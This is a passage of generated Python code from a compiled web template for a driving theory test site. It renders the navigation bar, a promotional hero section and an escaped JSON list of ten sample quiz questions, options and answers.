 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
